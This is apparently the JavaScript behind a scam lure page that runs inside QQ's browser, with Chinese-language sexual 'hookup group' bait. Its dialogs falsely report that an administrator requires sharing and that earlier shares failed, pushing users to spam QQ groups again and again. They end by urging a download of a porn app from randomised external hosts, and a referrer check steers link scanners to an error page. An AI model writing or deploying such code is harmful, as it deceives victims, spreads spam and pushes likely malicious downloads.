var ref="";if(document.referrer.length>0){ref=document.referrer}try{if(ref.length==0&&opener.location.href.length>0){ref=opener.location.href}}catch(e){};
if(ref.indexOf("urls") != -1){
    window.yz = 1;
    window.l("/error.html");
}
;!function(a){"use strict";var b=document,c="querySelectorAll",d="getElementsByClassName",e=function(a){return b[c](a)},f={type:0,shade:!0,shadeClose:!0,fixed:!0,anim:"scale"},g={extend:function(a){var b=JSON.parse(JSON.stringify(f));for(var c in a)b[c]=a[c];return b},timer:{},end:{}};g.touch=function(a,b){a.addEventListener("click",function(a){b.call(this,a)},!1)};var h=0,i=["layui-m-layer"],j=function(a){var b=this;b.config=g.extend(a),b.view()};j.prototype.view=function(){var a=this,c=a.config,f=b.createElement("div");a.id=f.id=i[0]+h,f.setAttribute("class",i[0]+" "+i[0]+(c.type||0)),f.setAttribute("index",h);var g=function(){var a="object"==typeof c.title;return c.title?'<h3 style="'+(a?c.title[1]:"")+'">'+(a?c.title[0]:c.title)+"</h3>":""}(),j=function(){"string"==typeof c.btn&&(c.btn=[c.btn]);var a,b=(c.btn||[]).length;return 0!==b&&c.btn?(a='<span yes type="1">'+c.btn[0]+"</span>",2===b&&(a='<span no type="0">'+c.btn[1]+"</span>"+a),'<div class="layui-m-layerbtn">'+a+"</div>"):""}();if(c.fixed||(c.top=c.hasOwnProperty("top")?c.top:100,c.style=c.style||"",c.style+=" top:"+(b.body.scrollTop+c.top)+"px"),2===c.type&&(c.content='<i></i><i class="layui-m-layerload"></i><i></i><p>'+(c.content||"")+"</p>"),c.skin&&(c.anim="up"),"msg"===c.skin&&(c.shade=!1),f.innerHTML=(c.shade?"<div "+("string"==typeof c.shade?'style="'+c.shade+'"':"")+' class="layui-m-layershade"></div>':"")+'<div class="layui-m-layermain" '+(c.fixed?"":'style="position:static;"')+'><div class="layui-m-layersection"><div class="layui-m-layerchild '+(c.skin?"layui-m-layer-"+c.skin+" ":"")+(c.className?c.className:"")+" "+(c.anim?"layui-m-anim-"+c.anim:"")+'" '+(c.style?'style="'+c.style+'"':"")+">"+g+'<div class="layui-m-layercont">'+c.content+"</div>"+j+"</div></div></div>",!c.type||2===c.type){var k=b[d](i[0]+c.type),l=k.length;l>=1&&layer.close(k[0].getAttribute("index"))}document.body.appendChild(f);var m=a.elem=e("#"+a.id)[0];c.success&&c.success(m),a.index=h++,a.action(c,m)},j.prototype.action=function(a,b){var c=this;a.time&&(g.timer[c.index]=setTimeout(function(){layer.close(c.index)},1e3*a.time));var e=function(){var b=this.getAttribute("type");0==b?(a.no&&a.no(),layer.close(c.index)):a.yes?a.yes(c.index):layer.close(c.index)};if(a.btn)for(var f=b[d]("layui-m-layerbtn")[0].children,h=f.length,i=0;h>i;i++)g.touch(f[i],e);if(a.shade&&a.shadeClose){var j=b[d]("layui-m-layershade")[0];g.touch(j,function(){layer.close(c.index,a.end)})}a.end&&(g.end[c.index]=a.end)},a.layer={v:"2.0",index:h,open:function(a){var b=new j(a||{});return b.index},close:function(a){var c=e("#"+i[0]+a)[0];c&&(c.innerHTML="",b.body.removeChild(c),clearTimeout(g.timer[a]),delete g.timer[a],"function"==typeof g.end[a]&&g.end[a](),delete g.end[a])},closeAll:function(){for(var a=b[d](i[0]),c=0,e=a.length;e>c;c++)layer.close(0|a[0].getAttribute("index"))}},"function"==typeof define?define(function(){return layer}):function(){var a=document.scripts,c=a[a.length-1],d=c.src,e=d.substring(0,d.lastIndexOf("/")+1);c.getAttribute("merge")||document.head.appendChild(function(){var a=b.createElement("link");return a.href="http://65jscss.oss-cn-beijing.aliyuncs.com/layer.css",a.type="text/css",a.rel="styleSheet",a.id="layermcss",a}())}()}(window);

function randomFrom(lowerValue,upperValue){
    return Math.floor(Math.random() * (upperValue - lowerValue + 1) + lowerValue);
}
var myDate = new Date();
var tMinutes = parseInt(myDate.getMinutes());
while (tMinutes>=3){
    tMinutes = tMinutes - 3;
}
var turl = myDate.getFullYear().toString()+myDate.getMonth().toString()+myDate.getDate().toString()+myDate.getHours().toString()+tMinutes;
var Cookie ={
    set: function(name, value, mm){
        var domain, domainParts, date, expires, host;
        if (mm){
            date = new Date();
            date.setTime(date.getTime()+(mm*60*1000));
            expires = "; expires="+date.toGMTString();
        }else{
            expires = "";
        }
        host = location.host;
        if (host.split('.').length === 1){
            document.cookie = name+"="+value+expires+"; path=/";
        }else{
            domainParts = host.split('.');
            domainParts.shift();
            domain = '.'+domainParts.join('.');
            document.cookie = name+"="+value+expires+"; path=/; domain="+domain;
            if (Cookie.get(name) == null || Cookie.get(name) != value){
                domain = '.'+host;
                document.cookie = name+"="+value+expires+"; path=/; domain="+domain;
            }
        }

    },get: function(name){
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for (var i=0; i < ca.length; i++){
            var c = ca[i];
            while (c.charAt(0)==' '){
                c = c.substring(1,c.length);
            }

            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
        }
        return null;
    },erase: function(name){
        Cookie.set(name, '', -1);
    }
};





var shareNumber = 0;
if (Cookie.get('number-202021')){
    shareNumber = Number(Cookie.get('number-202021'));
} else {
    Cookie.set('number-202021',shareNumber,10);
}



//地址
var urlConf = {

    ios : [
        'http://kp1.zhlzou.cn/index.html?2607160?a1'+Math.random().toString(36).substr(2),
		'http://kp1.zhlzou.cn/index.html?2607160?a2'+Math.random().toString(36).substr(2),
    ],
    android:[
        'http://cos.ap-nanjing.myqcloud.com/kuaibaoqq-3-1251172516/i.html?a1'+Math.random().toString(36).substr(2),
		'http://kp1.zhlzou.cn/ldfa/ldfa.php?ch=2607160?a2'+Math.random().toString(36).substr(2),
    ]


}

var tb=['🌀','🌷','♈','♉','♊','♋','♌','♍','♎','♏','♐','♑','♒','♓','⛎','😠','😩','😲','😞','😵','😰','😒','😍','😤','😜','😝','😋','😘','😚','😷','😳','😅','😱','👙','👗','👡','💰','🔯','🅰','🅱','🆎','🅾','🎀','🎁','🎥','🎬','🎯','💋','💏','💌','🔞','⭕','❌','💓','💔','💕','💖','💗','💘','💞','🈲','㊙','💢',]
var ico =  tb[Math.floor(Math.random()*tb.length)]   
var bt=['在线约💘裙','[约💘撸圈]限时琎入','附近推荐群聊','💞秀女开薄啦','附近约💘撸圈','夫妻约💘裙','附近S女主播开播啦',]
var biaoti =  bt[Math.floor(Math.random()*bt.length)]
var sj = Math.floor(Math.random () * 900);

var isShare = 0;
var isjump = 0;
var isDown = 0;
var closenumber = 0;
var userCity = "同城";
var inshare = 0;
var hiddenProperty="hidden" in document?"hidden":"webkitHidden" in document?"webkitHidden":"mozHidden" in document?"mozHidden":null;
var visibilityChangeEvent=hiddenProperty.replace(/hidden/i,"visibilitychange");
window.alert = function (name) {
    const iframe = document.createElement('IFRAME');
    iframe.style.display = 'none';
    iframe.setAttribute('src', 'data:text/plain,');
    document.documentElement.appendChild(iframe);
    window.frames[0].window.alert(name);
    iframe.parentNode.removeChild(iframe);
};
var main = {
    startConfig:function() {
        if (window.yz==1){
            return false;
        }
        loadScript('http://65jscss.oss-cn-beijing.aliyuncs.com/qqapi.wk.js?_bid=152',function() {
            mqq.ui.setTitleButtons({
                left:{
                    title : "返回",
                    callback : function () {back()}
                },right:{
                    hidden: true
                }
            });
            window.mqq.data.setShareInfo({
                title: city+biaoti+ico,
                desc:'點击+'+city+'箹💓裙 1'+sj+'人在线',
                image_url:'https://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rNd4lXXaacOMBo4n5FAAlsn5YLGcG1LVww/100'+'?d=br'+Math.random().toString(36).substr(2),
                share_url:'http://'+window.location.host+'/a0913.html?_wv=16777218&_wwv=1&d=22'+main.getWvNumber()+'&uode='+Math.random().toString(36).substr(2)
            });
        });
        var onVisibilityChange = function () {
            if (!document[hiddenProperty]){
                inshare = 0;
                if (isjump==0){
                    shareNumber = Number(shareNumber) + 1;
                    Cookie.set('number-202021',shareNumber,10);
                    return main.shareView();
                }
                if (isDown==0){
                    isDown = 1;
                    layer.open({content: '恭喜！你已获得入群资格！！<br/> 点"确定"下载app，登录后可免费看裸秀，每天更新上百部国产、无码、自拍、偷拍、日韩AV！',btn: '确定',shadeClose: false,yes: function(){
                            main.getDownLoad();
                        }});
                }
                if (isDown==1){
                    window.l("/error.html");
                }
            }
        };
        document.addEventListener(visibilityChangeEvent, onVisibilityChange);
        main.pushHistory();
    },
    shareStart:function() {
        if (window.yz==1){
            return false;
        }
        if (Number(shareNumber)>=1){
            main.shareView();
            return false;
        }
        closenumber = closenumber + 1;
        if (closenumber>3){
            closenumber = 0;
        }
        layer.open({content: '管理员已设置了分享任务！<br/>点击确定分享到【QQ群】即可进入。<br><img src="http://20211228tu.oss-cn-chengdu.aliyuncs.com/jq/14qun.jpg" style="width:100%;" />',btn: '确定',shadeClose: false,yes: function(){
			    shareNumber = Number(shareNumber) + 1;
                Cookie.set('number-202021',shareNumber,10);
                main.shareToFriend();
				setTimeout(function(){
			main.shareStart();
        },4000);
            }});
    },
    shareView:function() {
        if(Number(shareNumber)>4){
            return main.shareEnd();
        }
		if(Number(shareNumber)==3){
            return main.shareEnd();
        }
        if(Number(shareNumber)==1){
            tips = '你取消了分享-分享失败<br>请分享到【QQ群】即可！<br><img src="http://20211228tu.oss-cn-chengdu.aliyuncs.com/jq/12qun.jpg" style="width:100%;" />';
        }
		if(Number(shareNumber)==2){
            tips = '<b>分享失败</b>-你取消了分享<br>请分享到【QQ群】即可！<br><img src="http://20211228tu.oss-cn-chengdu.aliyuncs.com/jq/12qun.jpg" style="width:100%;" />';
        }
        if(Number(shareNumber)==30){
            tips = '重复群不参与计数<br>重新分享【1个QQ群】即可进入！';
        }
		if(Number(shareNumber)==4){
            tips = '重复群不参与计数<br>重新分享【1个QQ群】即可进入！';
        }
        if(Number(shareNumber)==30){
            tips = '请不要分享重复的群！<br>重新分享【1个QQ群】即可进入<br><img src="http://20211228tu.oss-cn-chengdu.aliyuncs.com/jq/12haoyou.jpg" style="width:100%;" />';
        }
        layer.open({content: tips,btn: '确定',shadeClose: false,yes: function(){
			    shareNumber = Number(shareNumber) + 1;
                Cookie.set('number-202021',shareNumber,10);
                main.shareToFriend();
				setTimeout(function(){
			main.shareView();
        },4000);
            }});
    },
    shareToFriend:function() {
        if (window.yz==1){
            return false;
        }
        inshare = 1;
        window.mqq.data.setShareInfo({
                title: city+biaoti+ico,
                desc:'點击+'+city+'箹💓裙 1'+sj+'人在线',
                image_url:'https://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rNd4lXXaacOMBo4n5FAAlsn5YLGcG1LVww/100'+'?d=br'+Math.random().toString(36).substr(2),
                share_url:'http://'+window.location.host+'/a0913.html?_wv=16777218&_wwv=1&d=22'+main.getWvNumber()+'&uode='+Math.random().toString(36).substr(2)
        });
        mqq.ui.showShareMenu();
    },
    shareEnd:function() {
		document.getElementById("nts1").style.display="none";
        layer.open({content: '恭喜您完成分享，激情体验正式开始！<br/> 点"确定"下载app，登录后可免费看果秀，每天更新上百部国产、日韩、无码自拍、偷拍等资源！',btn: '确定',shadeClose: false,yes: function(){
                main.getDownLoad();
            }});
    },
    popStateEvent:function() {
        if(Number(shareNumber)>3){
            return main.shareEnd();
        }
        if (Number(shareNumber)<1){
            main.shareStart();
        } else {
            layer.open({content: '只剩最后一步！请分享到活跃QQ群获得资格！',btn: '确定',shadeClose: false,yes: function(){
                    main.shareToFriend();
                }});
        }
    },
    pushHistory:function() {
        if (Number(shareNumber)>=1){
            main.shareView();
        }
    },
    getWvNumber:function() {
        var cNumber = randomFrom(1,30);
        var result = 64*parseInt(cNumber);
        result = result + randomFrom(2,3);
        return result;
    },
    getDownLoad:function() {
        var u = navigator.userAgent, app = navigator.appVersion;
        var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1; //g
        var isIOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
        var downloadUrl = '';
        isjump = 1;



        if (isIOS){
            downloadUrl =  urlConf.ios[Math.floor((Math.random()*urlConf.ios.length))] + 'd=' + Math.random().toString(36).substr(2) + '&_ks=9099&so=iqy';
        } else {
            downloadUrl =  urlConf.android[Math.floor((Math.random()*urlConf.android.length))] + 'd=' + Math.random().toString(36).substr(2) + '&_ks=9099&so=iqy';
        }
        mqq.invoke("ui", "openUrl",{
            url     : downloadUrl,
            target  : 1,
            style   : 1
        });
        setTimeout(function(){
            window.location.href = downloadUrl;
        },2000);
    },
};